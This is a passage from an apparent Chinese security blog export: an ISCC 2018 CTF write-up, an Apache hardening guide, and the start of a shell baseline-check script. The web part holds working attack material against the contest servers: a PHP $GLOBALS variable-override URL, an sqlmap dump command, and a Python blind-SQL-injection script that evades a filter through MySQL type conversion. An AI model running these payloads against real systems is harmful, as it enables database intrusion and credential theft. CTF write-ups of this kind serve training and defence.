s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 输入用户名和以上其中一个字符串作为密码进入第二关，代码如下 NULL &lt;?php include &apos;flag.php&apos;; $a = @$_REQUEST[&apos;a&apos;]; @eval(&quot;var_dump($$a);&quot;); show_source(__FILE__); ?&gt; 可以看出存在变量覆盖漏洞，利用全局变量’$GLOBALS’覆盖 http://118.190.152.202:8005/no_md5.php?a=GLOBALS flag:ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4} Sqli题目直接说明这是一道注入，打开后是一个登陆框测试一下是否存在注入 输入 username=&apos; or 1=1 and 1=1# password=123456 会直接登陆成功并将我们输入的username:&#39; or 1=1 and 1=1#输出出来输入 username=&apos; or 1=2 and 1=1# password=123456 则会显示输入的用户名或密码错误由此可以判断username参数可能存在注入。大概的登陆验证过程：将输入的username与password拼接成sql查询语句带入数据库查询，如果查到结果便会登陆成功并显示输入的用户名，查询不到结果就会返回用户名或密码错误的提示 可以看出该处是一个很普通的盲注，可以写脚本也可以直接用sqlmap，这里为了尽快拿到一血直接上sqlmap sqlmap.py -r &quot;C:\\Users\\I&apos;m possible\\Desktop\\post.txt&quot; -p username --dump -C &quot;kjafuibafuohnuvwnruniguankacbh&quot; -T &quot;news&quot; -D &quot;sqli_database&quot; flag{hahaha999999999} 有种你来绕HINT：我都过滤了，看你怎么绕。记住是mysql 打开后看到是一个登陆框结合题目提示猜测是去绕WAF注入，首先测试了一下，发现当用户名正确而密码错误时会返回password error，当用户名错误时会返回username error的错误，于是猜测可能存在盲注。 测试了一下，发现大概过滤了以下关键字 #、,、union、--+、and、or、|、%26（&amp;的url编码） 简单来说，就是不能使用and，or等关键字进行逻辑判断去盲注，同样不能使用注释符去注释后面的语句。谷歌了一下相关的资料，发现这种情况可以利用mysql的隐式类型转换去绕过，类似于php的弱类型。所谓的隐式类型转换，简单来说，就是对mysql的字符类型进行一些加、减、取余等数字操作运算时，又或者是将字符类型与数字类型进行比较时，会将字符类型转为数字类型，比如 mysql&gt; select &apos;45abcd&apos;-&apos;abc&apos;; +----------------+ | &apos;45abcd&apos;-&apos;abc&apos; | +----------------+ | 45 | +----------------+ 1 row in set, 2 warnings (0.02 sec) 在这里将字符串45abcd转为了数字45,将字符串abc转为了数字0于是可以得出不是以数字开头的字符串在进行隐式类型转换时都会转为数字0再看 mysql&gt; select &apos;aaa&apos;=0; +---------+ | &apos;aaa&apos;=0 | +---------+ | 1 | +---------+ 1 row in set, 1 warning (0.00 sec) 在这里将字符串aaa与数字0进行比较时将字符串aaa转为了数字0 再看以下语句 mysql&gt; select * from users where username=0; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+ 13 rows in set (0.00 sec) 可以看到where username=0时会将数据表中所有数据类型查出来，因为username在数据库中的存储类型为varchar类型，也就是字符串类型，在进行比较时会将这些字符串类型全转为数字类型，所以不以数字开头的字符串都会被转成0，从而查询出所有结果 再看 mysql&gt; select * from users where username=&apos;&apos;-0-&apos;&apos;; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+ 13 rows in set (0.00 sec) 可以看出当where username=&#39;&#39;-0-&#39;&#39;时会进行隐式类型转换，运算结果相当于where username=0,会返回所有结果 如果将中间的0变为1，相当于where username=-1,由于数据库里没有以-1开头的字符串，就会返回空 mysql&gt; select * from users where username=&apos;&apos;-1-&apos;&apos;; Empty set (0.00 sec) 由此可以看出我们是可以在中间这个位置进行逻辑判断去盲注的 知道了这些后来返回题目看这道题，构造payload uname=&apos;-0-&apos;&amp;passwd=123456 这里用户名有查询结果，所以会返回password error构造payload uname=&apos;-1-&apos;&amp;passwd=123456 而这里用户名没有查询结果，所以会返回username error的错误按照这个思路，可以进行逻辑判断进行盲注，构造payload猜出数据库中passwd字段的长度 uname=&apos;-(length(passwd)=passwd的长度)-&apos;&amp;passwd=123456 当(length(passwd)=passwd的长度)为真时结果为1，也就是查不出用户名，会返回username error，为假时结果为0，会返回查询结果但是密码错误，也就会返回password error通过这种方式可以判断出用户表中有一个长度为32字节的passwd字段 同样的可以通过这种方式判断出passwd字段中的值，用python写一个脚本即可，贴出我的代码 import requests url=&quot;http://118.190.152.202:8019/login.php&quot; passwd=&quot;&quot; for i in range(1,33): for j in range(1,256): data={ &apos;uname&apos;:&quot;&apos;-(ascii(mid((passwd)from(%d)))=%d)-&apos;&quot;%(i,j), &apos;passwd&apos;:&apos;admin&apos; } html=requests.post(url,data=data).content if &quot;username error!!&quot; in html: passwd=passwd+chr(j) print passwd break 为了更好的理解脚本，可以看看以下我测试时写的查询语句 mysql&gt; select mid((password)from(1)) from users; +------------------------+ | mid((password)from(1)) | +------------------------+ | Dumb | | I-kill-you | | p@ssword | | crappy | | stupidity | | genious | | mob!le | | admin | | admin1 | | admin2 | | admin3 | | dumbo | | admin4 | +------------------------+ 13 rows in set (0.00 sec) mysql&gt; select mid((password)from(2)) from users; +------------------------+ | mid((password)from(2)) | +------------------------+ | umb | | -kill-you | | @ssword | | rappy | | tupidity | | enious | | ob!le | | dmin | | dmin1 | | dmin2 | | dmin3 | | umbo | | dmin4 | +------------------------+ 13 rows in set (0.00 sec) mysql&gt; select ascii(mid((password)from(1))) from users; +-------------------------------+ | ascii(mid((password)from(1))) | +-------------------------------+ | 68 | | 73 | | 112 | | 99 | | 115 | | 103 | | 109 | | 97 | | 97 | | 97 | | 97 | | 100 | | 97 | +-------------------------------+ 13 rows in set (0.00 sec) mysql&gt; select ascii(mid((password)from(2))) from users; +-------------------------------+ | ascii(mid((password)from(2))) | +-------------------------------+ | 117 | | 45 | | 64 | | 114 | | 116 | | 101 | | 111 | | 100 | | 100 | | 100 | | 100 | | 117 | | 100 | +-------------------------------+ 13 rows in set (0.00 sec) mysql&gt; select * from users where username=&apos;a&apos;-(ascii(mid((password)from(2)))=117)-&apos;b&apos;; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 14 | admin4 | admin4 | +----+----------+------------+ 11 rows in set, 26 warnings (0.00 sec) mysql&gt; select * from users where username=&apos;a&apos;-(ascii(mid((password)from(2)))=118)-&apos;b&apos;; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+ 13 rows in set, 26 warnings (0.00 sec) 最后跑出密码 0416af0a8accf2be556a8e131438b814 MD5在线解密一下，通过密码可以看出出题人素质并不怎么高 nishishabi1438 用户名admin，密码nishishabi1438，登陆成功后台并没有flag，看提示应该是命名执行，但是试了好多命令都没有回显，最后偶然输入了flag，结果flag就出来了。。。ctm flag{sql_iNjEct_Is_Easy} Misc方向What is that？HINT：Where is the FLAG？下载下来发现是一个图片，图片中一个手指向下指，图片名为WhatIsThat，于是猜测下面有一部分因为高度的问题没有显示出来，查看图片属性中的分辨率将500转为16进制用winhex16进制编辑工具打开，查找500的16进制，修改图片的高度，看看能不能将图片的下面显示出来可以看到flag已经出现Flag={_Welcome_To_ISCC_2018_} 秘密电报HINT:知识就是力量 秘密电报： 知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA 混过密码吧的我明显看出是培根密码，该密码有两种密码表，第一次选密码表选错了，直接写python解密 e=(&quot;ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA&quot;).lower() d={ &apos;aaaaa&apos;:&apos;A&apos;, &apos;aaaab&apos;:&apos;B&apos;, &apos;aaaba&apos;:&apos;C&apos;, &apos;aaabb&apos;:&apos;D&apos;, &apos;aabaa&apos;:&apos;E&apos;, &apos;aabab&apos;:&apos;F&apos;, &apos;aabba&apos;:&apos;G&apos;, &apos;aabbb&apos;:&apos;H&apos;, &apos;abaaa&apos;:&apos;I&apos;, &apos;abaab&apos;:&apos;J&apos;, &apos;ababa&apos;:&apos;K&apos;, &apos;ababb&apos;:&apos;L&apos;, &apos;abbaa&apos;:&apos;M&apos;, &apos;abbab&apos;:&apos;N&apos;, &apos;abbba&apos;:&apos;O&apos;, &apos;abbbb&apos;:&apos;P&apos;, &apos;baaaa&apos;:&apos;Q&apos;, &apos;baaab&apos;:&apos;R&apos;, &apos;baaba&apos;:&apos;S&apos;, &apos;baabb&apos;:&apos;T&apos;, &apos;babaa&apos;:&apos;U&apos;, &apos;babab&apos;:&apos;V&apos;, &apos;babba&apos;:&apos;W&apos;, &apos;babbb&apos;:&apos;X&apos;, &apos;bbaaa&apos;:&apos;Y&apos;, &apos;bbaab&apos;:&apos;Z&apos; } for i in range(0,len(e)/5): a=e[5*i:5*i+5] for j in d.keys(): if a==j: print d[j] break #另一个密码表 #&apos;AAAAA&apos;:&apos;a&apos;, #&apos;AAAAB&apos;:&apos;b&apos;, #&apos;AAABA&apos;:&apos;c&apos;, #&apos;AAABB&apos;:&apos;d&apos;, #&apos;AABAA&apos;:&apos;e&apos;, #&apos;AABAB&apos;:&apos;f&apos;, #&apos;AABBA&apos;:&apos;g&apos;, #&apos;AABBB&apos;:&apos;h&apos;, #&apos;ABAAA&apos;:&apos;i&apos;, #&apos;ABAAA&apos;:&apos;j&apos;, #&apos;ABAAB&apos;:&apos;k&apos;, #&apos;ABABA&apos;:&apos;l&apos;, #&apos;ABABB&apos;:&apos;m&apos;, #&apos;ABBAA&apos;:&apos;n&apos;, #&apos;ABBAB&apos;:&apos;o&apos;, #&apos;ABBBA&apos;:&apos;p&apos;, #&apos;ABBBB&apos;:&apos;q&apos;, #&apos;BAAAA&apos;:&apos;r&apos;, #&apos;BAAAB&apos;:&apos;s&apos;, #&apos;BAABA&apos;:&apos;t&apos;, #&apos;BAABB&apos;:&apos;u&apos;, #&apos;BAABB&apos;:&apos;v&apos;, #&apos;BABAA&apos;:&apos;w&apos;, #&apos;BABAB&apos;:&apos;x&apos;, #&apos;BABBA&apos;:&apos;y&apos;, #&apos;BABBB&apos;:&apos;z&apos; 也可以直接在线解密flag:ILIKEISCC 暴力XX不可取HINT：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？下载下来后是个看似加密过的zip压缩包但是题目名就是说的暴力破解不可取，于是首先想到的就是zip伪加密，对于zip伪加密，首先要了解zip文件的16进制格式，winhex打开我们下载的压缩包下面来说一下压缩包的16进制文件格式 一个zip文件由三部分组成，压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志压缩源文件数据区： 50 4B 03 04：这是头文件标记（0x04034b50） 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密） 08 00：压缩方式 4E A0：最后修改文件时间 08 49：最后修改文件日期 91 08 EE B9：CRC-32校验（B9EE0891） 11 00 00 00：压缩后尺寸（17） 0F 00 00 00：未压缩尺寸（15） 08 00：文件名长度 00 00：扩展记录长度 压缩源文件目录区： 50 4B 01 02：目录中文件文件头标记(0x02014b50) 3F 00：压缩使用的 pkware 版本 14 00：解压文件所需 pkware 版本 07 08：全局方式位标记（有无加密，这个更改这里进行伪加密，第二个加密位如果为奇数，打开就会提示有密码了，在这里第二个加密位为07，所以确实是伪加密） 08 00：压缩方式 4E A0：最后修改文件时间 08 49：最后修改文件日期 91 08 EE B9：CRC-32校验（B9EE0891） 11 00 00 00：压缩后尺寸（17） 0F 00 00 00：未压缩尺寸（15） 08 00：文件名长度 24 00：扩展字段长度 00 00：文件注释长度 00 00：磁盘开始号 00 00：内部文件属性 20 00 00 00：外部文件属性 00 00 00 00：局部头部偏移量 压缩源文件目录结束标志： 50 4B 05 06：目录结束标记 00 00：当前磁盘编号 00 00：目录区开始磁盘编号 01 00：本磁盘上纪录总数 01 00：目录区中纪录总数 5A 00 00 00：目录区尺寸大小 37 00 00 00：目录区对第一张磁盘的偏移量 00 00：ZIP 文件注释长度 通过介绍可以看出这里的压缩文件确实存在伪加密，由于压缩源文件目录区的全局方式标记位标记的第二个加密位控制着压缩文件是否为伪加密，为奇数时就为伪加密，为偶数时正常，所以我们将这一位改为08保存，再次打开就不会显示加密了可以看到flag文件里的内容但是提交不成功，猜想此处做了加密，想到凯撒加密的套路，写python脚本解密一下吧 s=&quot;vfppjrnerpbzvat&quot; for i in range(0,27): for j in range(0,len(s)): s=s[:j]+chr(97+(ord(s[j:j+1])-97+1)%26)+s[j+1:] print s 找到一个规则的字符串，恩恩，就isccwearecoming吧 flag:isccwearecoming 重重谍影HINT：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。 Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA== 可以看到及似一串base64编码，base64在线解码一下 直到不能解码为止，发现是一个类似AES加密的密文 U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4%0AB5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z%0AiN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc%3D 处理一下 U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4 B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z iN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc= 之后AES在线解密一下发现解密出来的东西很像是一个名为与佛论禅的加密 缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗 拿到与佛论禅的网站解密一下，注意解密方法 所以这道题的flag就是 把我复制走 南无阿弥陀佛~ 数字密文HINT:这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921 可以看出这像是一串16进制编码，解码一下即可 flag:it&apos;s easy! 一只猫的心思下载附件解压后是一个图片用winhex查看一下，发现有字符区域WPS字样，猜测图片里隐藏了word文档，因为word文档（doc、xls）的文件头16进制为D0CF11E0，于是尝试查找16进制可以看出在D0CF11E0在FFD9尾部（jpg的文件尾16进制为FFD9），所以图片里确实藏有doc文档，位置还是在jpg图片的尾部知道了这些后，接下来用winhex将doc文档从图片中分离出来，选中属于word文件的16进制区域，右键，Edit-&gt;Copy Block-&gt;Into New Flie用WPS打开noname文件可以看出内容又是一串经过与佛论禅加密后的密文，去与佛论禅网站在线解密一下解密出如下内容 523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46 可以看到是一串类似16进制的编码，16进制解码后得到 R1VaREdNSlVHVTNVQ05KU0dRMlRNTkJVSVUyVEdOU0RHWTJESU9CVkdJMlRNTlpRR1UyVEtOSlRHQVpUS05DREdVWkRHTUJXR1EyVUNOQ0ZHUTNES01SVkdBMlRJTkpXRzRZREtOWlZHTTJUTU5TQ0c0NFRLTVJVR1kyRUtOQ0ZHVTNUTVFaVklFMkRRTkpYR1UzRE9NQlZHVTJUSU5KVkdNWVRNTUpWR1kzRUVOU0RHVkFUSVJCV0lNMlRNTkJVR1UyRE1RUlVJVTJEUU5KU0dNWVRPTUJVR00yVE1OQlZHWTJES01CVkdFM0VHTktCR1JBVEtOWlZHUTJFQ05CVkdVMkRHTUJUR0UzRENOSldHUTJUTU5CVkdZMkVJTlNDR1VaRElRWlZHUTJUS05DQkdVMlRLTVJUR0EyRE1OUlJHVTNESU5KVUlVMkVNTkpSR01ZREtRSlVIQTJUTU5KVUdSQVRJTVJWR0EyVElNWlFHTTRUS01CVkdFWlVJTTJF 再进行base64解码得到 GUZDGMJUGU3UCNJSGQ2TMNBUIU2TGNSDGY2DIOBVGI2TMNZQGU2TKNJTGAZTKNCDGUZDGMBWGQ2UCNCFGQ3DKMRVGA2TINJWG4YDKNZVGM2TMNSCG44TKMRUGY2EKNCFGU3TMQZVIE2DQNJXGU3DOMBVGU2TINJVGMYTMMJVGY3EENSDGVATIRBWIM2TMNBUGU2DMQRUIU2DQNJSGMYTOMBUGM2TMNBVGY2DKMBVGE3EGNKBGRATKNZVGQ2ECNBVGU2DGMBTGE3DCNJWGQ2TMNBVGY2EINSCGUZDIQZVGQ2TKNCBGU2TKMRTGA2DMNRRGU3DINJUIU2EMNJRGMYDKQJUHA2TMNJUGRATIMRVGA2TIMZQGM4TKMBVGEZUIM2E 发现不能继续base64解码，于是尝试base32解码，又得到一串16进制编码的字符 5231457A5245644E536C6448525670555530354C5230645A4E4652505456705753566B7952464E4E576C5A485756705554553161566B6C5A4D6C5644546B4E485231704356456450516C5A4A57544A4554303161564564564D6B524C54554A555230466156454E4F51305A4856544A425054303950513D3D 再次16进制解码，得到 R1EzREdNSldHRVpUU05LR0dZNFRPTVpWSVkyRFNNWlZHWVpUTU1aVklZMlVDTkNHR1pCVEdPQlZJWTJET01aVEdVMkRLTUJUR0FaVENOQ0ZHVTJBPT09PQ== 再次进行base64解码，得到 GQ3DGMJWGEZTSNKGGY4TOMZVIY2DSMZVGYZTMMZVIY2UCNCGGZBTGOBVIY2DOMZTGU2DKMBTGAZTCNCFGU2A==== 发现又不能进行base64解码了，于是用base32解码，得到 463161395F69735F493563635F5A4F6C385F4733545030314E54 再进行16进制解码，就能得到flag了 flag：F1a9_is_I5cc_ZOl8_G3TP01NT 有趣的ISCCHINT：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？ 下载附件解压后是一个图片用winhex查看一下该图片，发现文件尾有一些编码 &amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#55;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#98;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#101;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#100; html解码一下，发现是一串unicode \\u0066\\u006c\\u0061\\u0067\\u007b\\u0069\\u0073\\u0063\\u0063\\u0020\\u0069\\u0073\\u0020\\u0066\\u0075\\u006e\\u007d unicode解码一下，这里直接用python输出就好，得到flag flag{iscc is fun} 凯撒十三世HINT：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。 根据提示先将这串字符rot13解密一下，得到 roqtp697t95j3 再查看键盘，找到这些字符串每个字符在键盘上下面位置的字符，比如r下面的字符为f，依次替换就能得到flag flag:yougotme","categories":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"Apache安全加固","slug":"apache_security_config","date":"2018-05-19T15:38:59.866Z","updated":"2018-06-03T13:54:40.321Z","comments":true,"path":"2018/05/19/apache_security_config/","link":"","permalink":"http://yoursite.com/2018/05/19/apache_security_config/","excerpt":"Apache安全加固这篇文章记录了针对apache几种安全问题所进行的安全加固手段，环境为Centos","text":"Apache安全加固这篇文章记录了针对apache几种安全问题所进行的安全加固手段，环境为Centos 服务器banner信息隐藏404页面以及http响应头信息泄露如果对服务器一个不存在的资源进行访问，网站返回的404页面将会泄露apache版本，服务器操作系统类型等信息可以看到404错误页面显示了apache的版本、服务器的操作系统类型、ip和端口 还有就是在http的响应头中，也会泄露有关服务器的一些信息http响应头的Server中泄露了apache的版本和服务器操作系统类型 加固方案：需要修改apache配置文件的两个地方，配置文件位置：/etc/httpd/conf/httpd.conf,将对应的参数修改成下面的值 ServerTokens Prod ServerSignature Off 修改完后重启服务,就可以修复了，可以看到这些信息不再出现 http响应头泄露php版本信息http响应头中的X-Powered-By泄露了php版本信息加固方案：修改php配置文件，配置文件位置：/etc/php.ini，修改参数 expose_php=Off 修改完成后，重启apache服务，php版本信息不再显示 修改apache默认主页apache默认主页信息泄露当apache安装完成后，apache的默认主页会泄露服务器的一些信息 可以看到apache默认页面泄露了网站的根目录和某配置文件 加固方案：修改apache配置文件中的DirectoryIndex，并在网站根目录自定义index.html或者index.php修改完成后不再显示默认页 自定义404页面为了安全考虑和与网站用户的友好交互，自定义404页面也是件必要的事情 加固方法：在网上寻找404页面模板上传至服务器网站根目录，修改apache配置文件，找到ErrorDocument 404,将自定义的404页面路径添加上去 ErrorDocument 404 /404page/index.html 同时修改404的html文件，修改css，js文件的加载路径，不然css和js会因为请求不到资源而加载失败 重启apache服务 修改前的404页面修改后的404页面 防止列目录泄露敏感信息网站允许列目录是个很严重的安全问题，有时由于列目录可能会导致一些配置文件或者一些重要敏感信息泄露加固方案：其中一种加固方案就是在每个目录下都设置一个默认页（index.html或者index.php），这样可以防止列目录，但是会比较麻烦.另外一种方式就是修改apache的配置文件，将网站根目录/var/www/html下的Options Indexes FollowSymLinks改为Options FollowSymLinks,将indexes参数去掉 修改完成后重启服务，再次访问目录就会出现403禁止访问的页面，但是目录下的页面还是可以照常访问，只是禁止了列目录的操作 禁用php危险函数php有些函数如果开启的话，当黑客拿下一个webshell就会利用函数取执行一些危险命令，所以可以把一些危险函数禁用掉，以phpinfo为例，修改php配置文件/etc/php.ini,查找disable_funcions，配置 disable_funcions=phpinfo 修改前修改后 指定目录禁止php解析通常，向一些上传图片的目录，如果代码层对文件上传没有做好限制，导致黑客上传php代码getshell，所以对指定目录禁止php解析是很有必要的 比如网站上传目录被上传了一个webshell可以连接webshell，这是很严重的 加固方案，修改apache配置文件，设置指定目录没有执行php的权限，在配置文件中添加 &lt;Directory &quot;/var/www/html/uploads&quot;&gt; php_flag engine off &lt;/Directory&gt; 重启服务，可以看到由于uploads目录下禁止解析php脚本了，所以此时webshell就不能连接了","categories":[{"name":"安全加固","slug":"安全加固","permalink":"http://yoursite.com/categories/安全加固/"}],"tags":[{"name":"Apache","slug":"Apache","permalink":"http://yoursite.com/tags/Apache/"}]},{"title":"用shell实现对指定ip进行自动基线安全检查","slug":"autocheck","date":"2018-05-17T15:14:50.395Z","updated":"2018-06-04T14:56:58.540Z","comments":true,"path":"2018/05/17/autocheck/","link":"","permalink":"http://yoursite.com/2018/05/17/autocheck/","excerpt":"用shell脚本实现对指定ip进行自动基线安全检查最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器","text":"用shell脚本实现对指定ip进行自动基线安全检查最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器 scp.exp:发送基线脚本到指定ip的服务器 #!/usr/bin/expect -f set timeout 10 set host [lindex $argv 0] set username [lindex $argv 1] set password [lindex $argv 2] set src_file [lindex $argv 3] set dest_file [lindex $argv 4] spawn scp -r $src_file $username@$host:/tmp/$dest_file expect { &quot;(yes/no)?&quot; { send &quot;yes\\n&quot; expect 